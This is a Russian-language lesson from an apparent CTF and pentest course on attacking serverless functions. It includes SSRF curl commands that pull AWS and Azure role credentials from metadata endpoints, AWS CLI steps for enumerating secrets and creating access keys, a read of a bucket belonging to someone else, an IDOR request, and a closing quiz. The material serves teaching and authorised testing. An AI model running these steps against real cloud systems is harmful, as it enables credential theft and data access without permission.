---
id: web-serverless
title: "Serverless/FaaS: SSRF, event injection, холодный старт"
category: web
parent: web-ssrf-advanced
difficulty: hard
order: 2
tags: [serverless, lambda, faas, ssrf, cloud, event-injection]
prerequisites: [web-ssrf]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест облачных приложений"
estimated_minutes: 38
summary: "Атаки на serverless: SSRF к metadata/внутренним сервисам, инъекции в event-объекты, злоупотребление ролями и таймингами."
---

Serverless/FaaS (AWS Lambda, Google Cloud Functions, Azure Functions) меняет модель атак: нет долгоживущего сервера, но есть **роль IAM**, **общие тома** и **событийная модель**. Типовые баги — SSRF к metadata (получить роль), инъекция в обработку события (event injection), злоупотребление правами роли, утечки через `/tmp` (warm-контейнеры) и тайминги/DoS. Если приложение — «функция», классические веб-векторы комбинируются с облачными.

## Теория: особенности FaaS

- Каждая функция запускается в изолированном контейнере с **ролью** (IAM), дающей доступ к облачным ресурсам (S3, DynamoDB, KMS).
- Среда имеет **metadata-эндпоинт** (169.254.169.254) с временными кредами роли.
- Контейнеры **переиспользуются** (warm) — данные в `/tmp` и глобальных переменных видны между вызовами.
- Триггеры: HTTP (API Gateway), очереди (SQS), бакеты (S3), события (EventBridge) — ввод из любого источника.
- Переменные окружения содержат секреты/ключи.

## Вектор 1: SSRF к metadata/внутренним сервисам

Если функция делает HTTP-запрос по пользовательскому URL — SSRF к metadata даёт временные креды роли:

```bash
curl -s "https://app.example/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl -s "https://app.example/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>"
```

Полученные `AccessKeyId`/`SecretAccessKey`/`Token` → `aws sts get-caller-identity`, далее по `playbook-cloud`. Для GCP — `http://metadata.google.internal/computeMetadata/v1/` с заголовком `Metadata-Flavor: Google`. Для Azure — `http://169.254.169.254/metadata/identity/oauth2/token`.

## Вектор 2: event injection

Ввод приходит из событий (JSON) и часто попадает в команды/запросы без валидации:

- Инъекция в `event`/`body`/`headers` (SQLi/command/template).
- **S3-триггер:** имя загруженного объекта подставляется в путь/команду → traversal/command injection.
- **SQS-сообщение** с полем, уходящим в `eval`/`exec`.
- **Header injection** через API Gateway (заголовки события).

Проверяйте все поля события, а не только «обычные» параметры.

## Вектор 3: злоупотребление ролью

Даже без RCE, если функция имеет слишком широкую роль, можно ей воспользоваться: вызвать функцию с параметрами, которые заставят её читать чужие объекты S3 (`?bucket=...&key=...`), или записать файл. Проверяйте, что функция делает с правами роли и можно ли это «направить» на другие ресурсы.

## Вектор 4: общие /tmp и warm-контейнеры

Warm-контейнер сохраняет `/tmp` и глобальное состояние между вызовами. Атаки:

- **Cross-request data leak:** один пользователь пишет в `/tmp`, другой читает (если нет изоляции по запросу).
- **Race:** параллельные вызовы на одном warm-контейнере.
- **Кеш/сессия в глобальной переменной** — утечка чужой сессии.

## Вектор 5: тайминги и DoS

- **Cold start** — тайминг-атаки (разница из-за инициализации).
- **ReDoS** в обработке ввода.
- **Cost amplification** — заставить функцию делать дорогие вызовы (биллинг).
- **Параллельный флуд** — исчерпание concurrency.

## Разобранный пример: SSRF → role → S3

Шаг 1 — SSRF к metadata:

```bash
curl -s "https://app.example/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/lambda-role"
```

Шаг 2 — экспорт кред:

```bash
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity
```

Шаг 3 — перечисление ресурсов роли:

```bash
aws s3 ls
aws s3 cp s3://target-bucket/secret.txt -   # чтение чужого бакета
```

## Разобранный пример: обход авторизации через event

Функция `getUser(event)` берёт `event.userId` и возвращает данные, ожидая, что API Gateway проверил владельца. Вызываем напрямую (или через API с чужим `userId`):

```bash
curl -s -X POST https://api.example/getUser -d '{"userId":"victim"}'
```

Если функция доверяет `event.userId` — IDOR/BOLA. То же с `event.role`/`event.isAdmin`.

## Инструменты

- **`aws`/`gcloud`/`az` CLI** — работа с кредами роли.
- **`pacu`** — AWS-эксплуатация.
- **Burp Collaborator/`interactsh`** — детект SSRF.
- **`curl`** — ручные запросы.
- **`playbook-cloud`** — дальнейшая эскалация в облаке.

## Что дальше / decision

1. Функция делает исходящие запросы → SSRF к metadata.
2. Получили креды роли → `aws sts`, перечисление ресурсов.
3. Ввод из событий → проверьте все поля (SQLi/command/template).
4. Warm-контейнер → тестируйте `/tmp`/глобальные переменные на утечки.
5. Дальше — по `playbook-cloud` (IAM, бакеты, секреты).

## Частые ошибки

- **Игнорировать metadata.** Это главный путь к кредам роли.
- **Тестировать только HTTP-параметры.** События (S3/SQS) тоже ввод.
- **Забыть про warm-контейнер.** `/tmp` не изолирован по запросу.
- **Считать FaaS «безопасным по умолчанию».** Роль/события дают поверхность.
- **Ломать прод.** Дорогие вызовы/флуд — только с согласия.

## Метаданные и IAM по провайдерам

Serverless-функция почти всегда работает под ролью, и её временные креды лежат в metadata/переменных окружения. Ниже — точки сбора для трёх облаков.

| Провайдер | Метаданные | Переменные окружения |
|-----------|-----------|----------------------|
| AWS Lambda | `169.254.169.254/latest/meta-data/` (если не заблокировано) | `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN` |
| GCP Cloud Functions | `metadata.google.internal` (нужен `Metadata-Flavor: Google`) | `GOOGLE_APPLICATION_CREDENTIALS` |
| Azure Functions | `169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01` (нужен `Metadata: true`) | `IDENTITY_ENDPOINT`, `IDENTITY_HEADER` |
| Cloudflare Workers | нет metadata; bindings в env | `env.*` |

```bash
# AWS: креды роли из metadata (через SSRF)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# Azure: токен управляемой идентичности
curl -s -H 'Metadata: true' \
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
```

Полученные креды — прямой путь к злоупотреблению ролью: чтение S3/Blob, вызов других функций, доступ к секретам.

## Event injection: как формируется вход функции

Serverless-функция получает не HTTP, а **событие** (JSON), которое облако собирает из запроса. Инъекция — это подмена полей события.

```json
// пример события API Gateway: поля, которые могут влиять на логику
{
  "httpMethod": "GET",
  "path": "/admin",
  "headers": { "X-Forwarded-For": "127.0.0.1", "Authorization": "..." },
  "queryStringParameters": { "role": "admin" },
  "requestContext": { "identity": { "sourceIp": "127.0.0.1" } },
  "body": "..."
}
```

Что проверять: доверяет ли функция `X-Forwarded-For`/`sourceIp` (IP-allowlist обходится), полю `role` из query, заголовку `Authorization`, а также формату события (можно ли подсунуть поля, которых обычно нет). Инъекция в событие часто обходит проверки, сделанные на уровне API Gateway.

## Злоупотребление ролью (privilege escalation в IAM)

Даже без RCE роль функции может быть избыточной.

```bash
# 1) посмотреть, кто мы
aws sts get-caller-identity
# 2) перечислить политики/права
aws iam list-attached-role-policies --role-name <fn-role>
# 3) типовые эскалации
aws lambda list-functions            # доступ к другим функциям
aws s3 ls                            # бакеты
aws secretsmanager list-secrets      # секреты
aws iam create-access-key --user-name <self>   # если разрешено
```

Опасные разрешения: `iam:*`, `sts:AssumeRole` (на широкие роли), `lambda:UpdateFunctionCode` (внедрить код в другую функцию), `secretsmanager:GetSecretValue`.

## Warm-контейнеры и общие ресурсы

FaaS переиспользует контейнеры между вызовами. Это источник утечек между «изолированными» запросами.

| Ресурс | Риск |
|--------|------|
| `/tmp` | данные предыдущего вызова остаются |
| Глобальные переменные | кэш между запросами |
| `/proc/self/environ` | креды роли |
| Соединения к БД | переиспользование сессии |

```bash
# внутри функции: прочитать окружение (креды)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ || env | grep -i aws
# список файлов /tmp от прошлых вызовов
ls -la /tmp
```

Если функция читает конфиг/кэш из `/tmp`, предыдущий арендатор мог его подменить — классический shared-state баг.

## Инструменты

```bash
# pacu — AWS exploitation framework
pacu
# внутри: import_keys, run iam__enum_permissions, run lambda__enum
# serverless: локальная эмуляция и проверка
serverless invoke local --function fn --data '{"role":"admin"}'
# scoutsuite — аудит облачной конфигурации
scoutsuite aws --profile default
# nuclei — облачные SSRF-шаблоны
nuclei -u https://app.example -tags ssrf,cloud -j
```

## Что делать дальше / решение

1. **Найдите SSRF/инъекцию.** Точка, где функция делает запрос или читает событие.
2. **Соберите креды.** Metadata/переменные окружения.
3. **Оцените роль.** Какие ресурсы доступны.
4. **Проверьте event injection.** Доверие к заголовкам/полям события.
5. **Проверьте warm-состояние.** `/tmp`, кэш, соединения.
6. **Зафиксируйте PoC.** Креды/данные, полученные через роль.

## Практика и справочники

- **HackTricks** — «AWS», «Serverless», metadata.
- **OWASP Serverless Top 10** — классы уязвимостей.
- **pacu / ScoutSuite** — эксплуатация и аудит.
- **PayloadsAllTheThings** — SSRF/cloud.

## Практические приоритеты в serverless

В serverless-приложениях чаще всего встречаются три вещи: SSRF к metadata (потому что функции часто ходят по URL из пользовательского ввода), доверие к полям события (потому что разработчик считает, что API Gateway уже всё проверил) и избыточные IAM-роли (потому что «поставим `*`, потом сузим»). Начните с поиска SSRF: если функция принимает URL, обрабатывает вебхук или импортирует данные по ссылке — это первый кандидат. Затем проверьте, какие поля события влияют на авторизацию (IP, роль, заголовки), и, наконец, оцените роль через полученные креды.

## Итог

Serverless не отменяет классические уязвимости — он меняет контекст: вход — это событие, окружение — контейнер с ролью, а сеть — metadata-сервис. Проверяйте SSRF, event injection, IAM-права и shared-state (warm-контейнеры, `/tmp`). Именно роль функции чаще всего превращает небольшой баг в доступ к данным всего облачного аккаунта.

## Частые ошибки при тестировании serverless

- Считать, что «нет сервера — нет атак». Контекст меняется, а классы уязвимостей остаются.
- Проверять только HTTP-эндпоинт и забывать, что функция читает **событие**, а не запрос.
- Игнорировать роль: полученные креды часто дают куда больше, чем ожидается.
- Не проверять `/tmp` и глобальные переменные — состояние переживает вызовы.
- Забыть про регион и аккаунт: креды роли привязаны к конкретному окружению.

## Кратко

Serverless-тест сводится к четырём вопросам: куда функция делает запрос (SSRF), каким полям события она доверяет, что позволяет её роль и что остаётся в контейнере между вызовами. Ответы на них почти всегда дают цепочку «небольшой баг → доступ к данным всего аккаунта».

## Квиз

```quiz
- question: "Где в Lambda лежат IAM-креды роли?"
  options:
    - "В /etc/passwd"
    - "В metadata 169.254.169.254 (или env)"
    - "В cookie"
    - "В TLS"
  answer: 1
  explanation: "Как у EC2, но через env/STS."
- question: "Что такое event injection?"
  options:
    - "SQL-инъекция"
    - "Подмена полей event-объекта (authorizer/claims/body)"
    - "XSS"
    - "CSRF"
  answer: 1
  explanation: "Код доверяет структуре события."
- question: "Чем опасен общий /tmp в FaaS?"
  options:
    - "Он маленький"
    - "Утечка данных между вызовами одного контейнера"
    - "Он шифруется"
    - "Он кешируется"
  answer: 1
  explanation: "Контейнер переиспользуется (warm)."
- question: "Почему роль Lambda часто избыточна?"
  options:
    - "Так дешевле"
    - "Разработчики дают широкие права для удобства -> захват S3/Secrets"
    - "Так быстрее"
    - "Это требование AWS"
  answer: 1
  explanation: "Least privilege нарушается."
- question: "Как называется рекурсивный вызов Lambda -> Lambda?"
  options:
    - "Cold start"
    - "Amplification/экономический DoS"
    - "Warm start"
    - "Snap start"
  answer: 1
  explanation: "Может усиливать нагрузку/стоимость."
```

## Где пригодится

- **CTF (Web):** облачные задачи.
- **Bug bounty:** SSRF к metadata — critical.
- **Пентест:** аудит serverless-архитектур.
- **Работа (AppSec/Cloud):** least privilege, IMDSv2/изоляция, валидация event, секрет-менеджмент.
